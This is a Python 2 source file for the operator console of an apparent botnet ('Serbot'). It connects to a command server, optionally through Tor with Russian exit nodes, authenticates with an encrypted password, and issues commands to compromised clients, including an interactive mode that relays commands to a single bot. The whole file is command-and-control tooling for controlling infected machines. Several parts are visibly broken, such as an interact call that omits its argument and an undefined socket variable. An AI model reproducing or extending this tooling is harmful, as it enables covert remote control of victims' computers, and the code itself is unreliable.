#!/usr/bin/env python
# -*- coding: utf-8 -*-

import argparse
from ConfigParser import SafeConfigParser
import os
import sys
import socks
from socket import *
import StringIO
import stem.process
from stem.util import term
import time

from controlApi import *
from encryption import *

config = {}
execfile("Control.conf", config) 	
	

class control():
	
	def startTor(self):
		print(term.format(" [+] Starting Tor Connection", term.Attr.BOLD))
		global tor_process
		tor_process = stem.process.launch_tor_with_config(
			config = {
				'SocksPort': str(SOCKS_PORT),
				'ExitNodes': '{ru}',
			},
			init_msg_handler = print_bootstrap_lines,
		)

	def stopTor(self):
		tor_process.kill() 
	
	def interact(self, client):
		action = None
		baseCmd = {"status":"OK", "command": "interact", "client":str(client), "action":action}
		title = "Client{cli}$".format(cli=client)
		while True:
			action = raw_input(title)
			if action == "quit": break
			else:
				command = Encode().process(baseCmd)
				command = encryption().encrypt(command, config["password"])
				main().s.send(command)
				reply = s.recv(20480)
				reply = encryption().decrypt(reply, config["password"])
				print "Reply: " + str(reply)
				Reply = Api().main(reply)
				print str(Reply)
		
	def main(self):
		try:
			if config["tor"]==True and config["server"] != "127.0.0.1":
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 5090)
				socket.socket = socks.socksocket
			else:pass
			s=socket(AF_INET, SOCK_STREAM)
			s.connect((config["server"],config["port"]))
		except Exception as e:
			sys.exit(e)

		login = {"version":config["_API_VERSION"], "user":"control", "status":"OK", "command":"authenticate", 'password':str(args.password)}
		login = Encode().process(login)
		login = encryption().encrypt(login, config["password"])
		s.send(login)

		while True:
			command = raw_input("Serbot$ ")
			try:
				if(command == "clear"):
					if sys.platform == "win32": os.system("cls")
					else: os.system("clear")
				elif(command == "help"):
					print config["allcommands"]
				else:
					answers = command.split(' ')
					if answers[0] == "interact" and len(answers) == 2:
						Cmd = {"version":config["_API_VERSION"], "user":"control", "status":"OK", "command": answers[0], "client":str(answers[1])}
						inter = control().interact()
					else: Cmd = {"version":config["_API_VERSION"], "user":"control", "status":"OK", "command": answers[0]}
					Cmd = Encode().process(Cmd)
					Cmd = encryption().encrypt(Cmd, config["password"])
					s.send(Cmd)
					reply = s.recv(20480)
					reply = encryption().decrypt(reply, config["password"])
					print "Reply: " + str(reply)
					Reply = Api().main(reply)
					print str(Reply)

			except KeyboardInterrupt:
				try:
					s.send("quit")
					s.close()
					control().stopTor()
					print " [!] Connection Closed"
					break
				except:
					pass
			except Exception as e:
				print e
				print " [!] Connection Closed"
				s.close()
				control().stopTor()
				break

if __name__=="__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("-p", "--password", type=str, help="Bridge Connection Password", required = True)
	parser.add_argument('-v', '--version', action='version', version= config["_version"])
	args = parser.parse_args()
	if sys.platform == 'win32': os.system("cls")
	else: os.system("clear")
	print config["intro"]
	control().main()
